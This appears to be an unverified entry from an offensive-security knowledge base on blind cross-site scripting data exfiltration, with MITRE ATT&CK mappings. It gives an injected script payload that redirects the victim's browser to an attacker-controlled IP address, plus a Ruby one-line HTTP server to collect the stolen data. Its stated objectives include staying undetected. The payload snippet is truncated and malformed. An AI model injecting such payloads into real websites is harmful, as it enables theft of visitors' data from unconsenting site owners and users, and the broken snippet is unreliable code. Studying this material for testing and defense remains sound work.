---
id: 3b27c092-6ec2-45f7-aafc-2487760a77ca
name: Blind XSS Data Exfiltration
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:42.233629+00:00'
updated_at: '2023-04-10T20:21:34.630466+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Exfiltration|TA0010 - Exfiltration]]'
techniques:
- '[[Exfiltration Over Alternative Protocol|T1048 - Exfiltration Over Alternative
  Protocol]]'
- '[[Scripting|T1064 - Scripting]]'
tags:
- '[[Blind XSS]]'
- '[[Cross Site Scripting]]'
- '[[Tips]]'
commands:
- '[[Start Ruby HTTP server]]'
---

# Blind XSS Data Exfiltration

## Summary

Blind XSS is a type of XSS vulnerability where the attacker cannot see the output of their payload. This technique can be used to exfiltrate data from a target by encoding the stolen data into the payload and sending it to a controlled server. The One-line HTTP Server command can be used to set up 

## Description

# Description

Blind XSS is a type of XSS vulnerability where the attacker cannot see the output of their payload. This technique can be used to exfiltrate data from a target by encoding the stolen data into the payload and sending it to a controlled server. The One-line HTTP Server command can be used to set up a simple server to receive the stolen data. This technique has a high offensive value as it allows an attacker to steal sensitive data without being detected. From a technical perspective, the attacker would need to find a vulnerable web application, inject their payload, and wait for a target to trigger the payload. From a business perspective, this technique can lead to data breaches and loss of sensitive information.

## Requirements

1. Access to a vulnerable web application with Blind XSS vulnerability.

1. Ability to inject payload into the web application.

1. One-line HTTP Server command.

## Defense

1. Implement input validation and output encoding to prevent XSS attacks.

1. Monitor network traffic for suspicious activity.

1. Use a web application firewall to detect and block XSS attacks.

## Objectives

1. Exfiltrate sensitive data from a target using Blind XSS.

1. Remain undetected while stealing data.

1. Compromise a vulnerable web application.

# Instructions

1. To use the Data Grabber for XSS, simply inject the provided script into the vulnerable input field on the target website. This script will send the data of the current domain to the specified URL, allowing you to confirm whether a blind XSS vulnerability exists on the target website.

**Code**: [[<script>document.location='http://10.10.14.30:8080]]

> The Data Grabber for XSS is a useful tool for confirming the existence of a blind XSS vulnerability on a target website. By injecting the provided script into a vulnerable input field, the script will send the domain data to a specified URL. This allows you to confirm whether the website is vulnerable to blind XSS attacks before deploying a heavy blind-XSS testing tool.

2. To start a one-line HTTP server, run the following command in your terminal:

This command uses the Ruby programming language to start a simple HTTP server on your local machine. The server will serve files from the current directory and will be accessible at http://localhost:8080. You can use this command to quickly share files with others on your local network or to test web applications that you are developing.

**Command** ([[Start Ruby HTTP server]]):

```bash
$ ruby -run -ehttpd . -p8080
```

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]
- [[Exfiltration|TA0010 - Exfiltration]]

### Techniques

- [[Exfiltration Over Alternative Protocol|T1048 - Exfiltration Over Alternative Protocol]]
- [[Scripting|T1064 - Scripting]]

## Commands Used

- [[Start Ruby HTTP server]]

## Tags

- [[Blind XSS]]
- [[Cross Site Scripting]]
- [[Tips]]
